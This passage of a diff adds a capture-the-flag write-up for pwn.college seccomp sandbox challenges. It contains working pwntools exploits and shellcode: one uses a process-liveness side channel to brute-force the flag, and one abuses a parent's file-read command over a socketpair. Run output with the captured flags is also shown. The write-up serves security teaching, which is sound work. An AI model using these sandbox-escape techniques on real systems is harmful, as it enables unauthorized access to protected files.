+    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+
+    puts("Executing shellcode!\n");
+
+    assert(seccomp_load(ctx) == 0);
+
+    ((void(*)())shellcode)();
+}
+```
+
+This challenge only allows the `read` syscall. The program opens the file passed in `argv[1]` before enabling `seccomp`, so `/flag` is already available to us on fd `3`.
+
+Since write, exit, and nanosleep are blocked, we need another side channel. The approach here is to distinguish between:
+- a process that is still alive
+- a process that was killed by `seccomp`
+
+The shellcode reads the flag into memory and compares one byte against a guessed character.
+
+If the guess is correct, the shellcode enters an infinite loop:
+
+```asm
+loop:
+    jmp loop
+```
+
+If the guess is wrong, it executes a forbidden syscall:
+
+```asm
+mov eax, 60
+syscall
+```
+
+Since `exit` is not allowed, `seccomp` immediately kills the process.
+
+The parent Python script simply checks:
+
+```py
+p.poll() is None
+```
+
+If the process is still running, the guessed byte was correct. Otherwise, the guess was wrong.
+
+### Exploit
+
+```py title="" showLineNumebers
+from pwn import *
+import string
+import time
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+BUF = 0x1337800
+
+flag = b""
+
+charset = string.ascii_letters + string.digits + "{}._-"
+
+for idx in range(128):
+
+    found = False
+
+    for c in charset:
+
+        guess = ord(c)
+
+        shellcode = asm(f"""
+            mov rdi, 3
+            mov rsi, {BUF}
+            mov rdx, 0x100
+            xor eax, eax
+            syscall
+
+            mov al, byte ptr [{BUF}+{idx}]
+            cmp al, {guess}
+            jne wrong
+
+        loop:
+            jmp loop
+
+        wrong:
+            mov eax, 60
+            syscall
+        """)
+
+        p = process([
+            "/challenge/babyjail_level12",
+            "/flag"
+        ])
+
+        p.send(shellcode)
+
+        time.sleep(0.1)
+
+        # still running => correct guess
+        if p.poll() is None:
+
+            p.kill()
+
+            flag += c.encode()
+
+            print(flag.decode())
+
+            found = True
+
+            if c == "}":
+                print("\nFLAG:", flag.decode())
+                exit()
+
+            break
+
+        p.close()
+
+    if not found:
+        print("failed")
+        break
+```
+
+```
+hacker@sandboxing~seccomp-readonly:~$ python ~/script.py
+p
+pw
+pwn
+pwn.
+pwn.c
+pwn.co
+pwn.col
+pwn.coll
+pwn.colle
+pwn.colleg
+pwn.college
+pwn.college{
+pwn.college{c
+pwn.college{cg
+pwn.college{cgx
+pwn.college{cgxP
+pwn.college{cgxPi
+pwn.college{cgxPiI
+pwn.college{cgxPiIo
+pwn.college{cgxPiIoJ
+pwn.college{cgxPiIoJT
+pwn.college{cgxPiIoJTF
+pwn.college{cgxPiIoJTF-
+pwn.college{cgxPiIoJTF-5
+pwn.college{cgxPiIoJTF-53
+pwn.college{cgxPiIoJTF-53P
+pwn.college{cgxPiIoJTF-53P0
+pwn.college{cgxPiIoJTF-53P0g
+pwn.college{cgxPiIoJTF-53P0gY
+pwn.college{cgxPiIoJTF-53P0gY7
+pwn.college{cgxPiIoJTF-53P0gY72
+pwn.college{cgxPiIoJTF-53P0gY72L
+pwn.college{cgxPiIoJTF-53P0gY72Ld
+pwn.college{cgxPiIoJTF-53P0gY72LdI
+pwn.college{cgxPiIoJTF-53P0gY72LdIZ
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7L
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0l
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0I
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0ID
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4I
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4IT
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0E
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0Ez
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW
+pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW}
+
+FLAG: pwn.college{cgxPiIoJTF-53P0gY72LdIZN7LM.0lM0IDL4ITM0EzW}
+```
+
+&nbsp;
+
+## process-isolation
+
+> Escape a different kind of sandbox in which a jailed child process is only communicable to from a parent process.
+
+```c title="/challenge/babyjail_level13.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/sendfile.h>
+
+#include <seccomp.h>
+
+int child_pid;
+
+void cleanup(int signal)
+{
+    puts("Time is up: terminating the child and parent!\n");
+    kill(child_pid, 9);
+    kill(getpid(), 9);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    assert(argc > 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts("This challenge will fork into a jail. Inside of the child process' jail, you will only be able to communicate with the");
+    puts("parent process. If you want the flag, you must convince the parent process to give it to you.\n");
+    for (int i = 3; i < 10000; i++) close(i);
+
+    puts("Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are");
+    puts("connected: data written to one can be read from the other, and vice-versa.\n");
+    int file_descriptors[2];
+    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, file_descriptors) == 0);
+    int parent_socket = file_descriptors[0];
+    int child_socket = file_descriptors[1];
+
+    printf("The parent side of the socketpair is FD %d.\n", parent_socket);
+    printf("The child side of the socketpair is FD %d.\n", child_socket);
+
+    puts("Registering a cleanup function that will run 1 second from now and terminate both the parent and child.\n");
+    alarm(1);
+    signal(SIGALRM, cleanup);
+
+    puts("Forking into a parent and child (sandbox) process.\n");
+    child_pid = fork();
+    if (!child_pid)
+    {
+        puts("The child will now close itself off from the world, except for the child side of the socketpair.\n");
+        close(0);
+        close(1);
+        close(2);
+        close(parent_socket);
+
+        void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+        assert(shellcode == (void *)0x1337000);
+        printf("The child mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+        scmp_filter_ctx ctx;
+
+        puts("Restricting system calls (default: kill).\n");
+        ctx = seccomp_init(SCMP_ACT_KILL);
+        printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
+        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+        printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
+        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
+        printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
+        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);
+
+        assert(seccomp_load(ctx) == 0);
+
+        read(child_socket, shellcode, 0x1000);
+
+        write(child_socket, "print_msg:Executing shellcode!", 128);
+
+        ((void(*)())shellcode)();
+    }
+
+    else
+    {
+        puts("The parent is reading 0x1000 bytes of shellcode from stdin.\n");
+        char shellcode[0x1000];
+        read(0, shellcode, 0x1000);
+
+        puts("The parent is sending the shellcode to the child.\n");
+        write(parent_socket, shellcode, 0x1000);
+
+        while (true)
+        {
+            char command[128] = { 0 };
+
+            puts("The parent is waiting for a command from the child.\n");
+            int command_size = read(parent_socket, command, 128);
+            command[9] = '\0';
+
+            char *command_argument = &command[10];
+            int command_argument_size = command_size - 10;
+
+            printf("The parent received command `%.10s` with an argument of %d bytes from the child.\n", command, command_argument_size);
+
+            if (strcmp(command, "print_msg") == 0)
+            {
+                puts(command_argument);
+            }
+            else if (strcmp(command, "read_file") == 0)
+            {
+                sendfile(parent_socket, open(command_argument, 0), 0, 128);
+            }
+            else
+            {
+                puts("Error: unknown command!\n");
+                break;
+            }
+        }
+    }
+}
+```
+
+This challenge forks into a parent and child process connected through a socketpair.
+
+The child process is sandboxed with `seccomp` and only allows:
+- `read`
+- `write`
+- `exit`
+
+It also closes STDIN, STDOUT, STDERR, so the child cannot directly print anything or access files itself.
+
+However, the parent exposes a command interface over the socket:
+
+```c title="" showLineNumbers
+# ---- snip ----
+
+            else if (strcmp(command, "read_file") == 0)
+            {
+                sendfile(parent_socket, open(command_argument, 0), 0, 128);
+            }
+
+# ---- snip ----
+```
+
+This means the child can ask the parent to open arbitrary files and send their contents back.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+
+shellcode = asm(r"""
+    /* socket fd is 4 */
+    mov rdi, 4
+
+    /* write(4, "read_file:/flag", 128) */
+    lea rsi, [rip + req]
+    mov rdx, 128
+    mov rax, 1
+    syscall
+
+    /* read flag back from parent */
+    mov rdi, 4
+    lea rsi, [rip + buf]
+    mov rdx, 128
+    xor eax, eax
+    syscall
+
+    /* send print_msg:<flag> */
+    mov rdi, 4
+    lea rsi, [rip + msg]
+    mov rdx, 10
+    mov rax, 1
+    syscall
+
+    mov rdi, 4
+    lea rsi, [rip + buf]
+    mov rdx, 128
+    mov rax, 1
+    syscall
+
+    mov eax, 60
+    xor edi, edi
+    syscall
+
+req:
+    .ascii "read_file:/flag"
+    .zero 112
+
+msg:
+    .ascii "print_msg:"
+
+buf:
+    .space 128
+""")
+
+p = process("/challenge/babyjail_level13")
+p.send(shellcode)
+p.interactive()
+```
+
+```
+hacker@sandboxing~process-isolation:~$ python ~/script.py
+[+] Starting local process '/challenge/babyjail_level13': pid 9152
+[*] Switching to interactive mode
+###
+### Welcome to /challenge/babyjail_level13!
+###
+
+This challenge will fork into a jail. Inside of the child process' jail, you will only be able to communicate with the
+parent process. If you want the flag, you must convince the parent process to give it to you.
+
+Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are
+connected: data written to one can be read from the other, and vice-versa.
+
+The parent side of the socketpair is FD 3.
+The child side of the socketpair is FD 4.
+Registering a cleanup function that will run 1 second from now and terminate both the parent and child.
+
+Forking into a parent and child (sandbox) process.
+
+The parent is reading 0x1000 bytes of shellcode from stdin.
+
+The parent is sending the shellcode to the child.
+
+The parent is waiting for a command from the child.
+
+The child will now close itself off from the world, except for the child side of the socketpair.
+
+[*] Process '/challenge/babyjail_level13' stopped with exit code 0 (pid 9152)
+The parent received command `print_msg` with an argument of 118 bytes from the child.
+Executing shellcode!
+The parent is waiting for a command from the child.
+
+The parent received command `read_file` with an argument of 118 bytes from the child.
+The parent is waiting for a command from the child.
+
+The parent received command `print_msg` with an argument of 118 bytes from the child.
+pwn.college{EVmH-bA6jU8y4TbvwJYEQigkn-H.01M0IDL4ITM0EzW}
+
+The parent is waiting for a command from the child.
+
+The parent received command `` with an argument of 0 bytes from the child.
+Error: unknown command!
+
+[*] Got EOF while reading in interactive
+$  
 ```
